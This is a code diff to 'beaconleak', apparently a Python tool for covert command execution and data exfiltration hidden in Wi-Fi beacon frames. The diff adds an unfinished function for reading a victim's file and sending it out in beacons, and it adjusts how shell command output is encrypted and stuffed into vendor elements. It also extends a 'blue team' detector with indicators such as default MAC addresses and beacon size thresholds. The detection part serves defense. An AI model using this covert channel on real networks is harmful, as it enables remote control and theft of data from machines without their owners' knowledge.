@@ -87,6 +87,16 @@ class beaconleak():
             result = subprocess.check_output(cmd, shell=True)
         return result
 
+    def stuff_bytes(self, file):
+        # called as victim, this will read a file, send its contents in the 
+        # beacon.
+        # TODO finish this dude.
+        file_size = None
+        with open(file, 'rb+') as f:
+            pass
+            
+
+
     def beacon_craft(self, msg):
         # general case
         # TODO add type/structure definition to class
@@ -201,11 +211,13 @@ class beaconleak():
                 while elements:
                     # TODO fix error here, 128 is only a marker, must extract response from 254
                     if elements.ID == 128:
+                        elements = elements.payload
                         if self.debug:
                             print("[d] response frame:\n{}".format(frame.command()))
                             print("[d] received:{}".format(elements.info.hex()))
-                        msg = dec_payload(elements.info)
-                        print(msg.decode('utf-8'))
+                        msg = self.dec_payload(elements.info)
+                        print(msg)
+                        break
                     i = i + 1
                     elements = elements.payload
   
@@ -215,10 +227,11 @@ class beaconleak():
         if self.debug:
             print("[d] received:{}".format(enc.hex()))
         try:
-            c = self.box.decrypt(enc)
+            c = self.box.decrypt(enc).decode('utf-8')
             if self.debug:
-                print("[d] decrypted: {}".format(c.decode('utf-8')))
+                print("[d] decrypted: {}".format(c))
         except Exception as e:
+            c = "[e] Could not decrypt, wrong PSK or error in received beacon!"
             if self.debug:
                 print("[e] Could not decrypt, wrong PSK or error in received beacon!")
                 print("[e] " + str(e))
@@ -240,7 +253,7 @@ class beaconleak():
             if self.debug:
                 print("[d] Command Result:\n{}".format(result.decode('utf-8')))
             result_e = self.box.encrypt(result)
-            frame[Dot11Elt][cut] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e)) / Dot11Elt(ID=255, info=b'\x01\x01\x01\x01', len=4)
+            frame[Dot11Elt][cut] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e))
             if self.debug:
                 print("[d] sending:{}".format(result_e.hex()))
                 print("[d] response frame:\n{}".format(frame.command()))
@@ -317,6 +330,7 @@ class beaconleak():
         if best_frame == 0:
             if not self.beacons:
                 print("[i] No beacons found on this channel, proceeding with defaults")
+                self.covert = False
                 return
             else:
                 discard, best_frame = self.beacons.popitem()
@@ -328,23 +342,28 @@ class beaconleak():
         self.bssid = best_frame.addr2
 
     # this is for the blue teamers
+    # IoC detection from simple test to complex test
     def detect(self, frame):
         if frame.haslayer(Dot11Beacon):
             ssid = frame.info.decode('utf-8')
             elements = frame.getlayer(Dot11Elt)
-            # TODO add MAC Adress validation detection case
+            # TODO add MAC Adress validation detection case            
             # IoC: pyExfil defaults
             if frame.addr2 == "00:00:00:00:00:42" or ssid == "pyExfil":
-                print("[!] Beacon Stuffing Detected! (SSID:{}, PyExfil Defaults".format(ssid))
-                if self.debug:
-                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
+                print("[!] Beacon Stuffing Detected! (SSID:{}, PyExfil Defaults)".format(ssid))
                 self.detected += 1
                 return
             # IoC: beaconLeak defaults
             if frame.addr2 == "00:14:bf:de:ad:c0":
-                print("[!] Beacon Stuffing Detected! (SSID:{}, beaconLeak Defaults".format(ssid))
-                if self.debug:
-                        print("[{}] Data: {}".format(self.detected, elements.info.hex()))
+                print("[!] Beacon Stuffing Detected! (SSID:{}, beaconLeak Defaults)".format(ssid))
+                self.detected += 1
+                return
+            # IoC: Beacon size sample std. dev.
+            l_tresh = 175 # these numbers were made with 
+            h_tresh = 352 # SCIENCE!
+            l_frame = len(frame)
+            if l_frame < l_tresh or l_frame > h_tresh:
+                print("[!] Beacon Stuffing Detected! (SSID:{}, Beacon Size Treshold)".format(ssid))
                 self.detected += 1
                 return
             while elements:
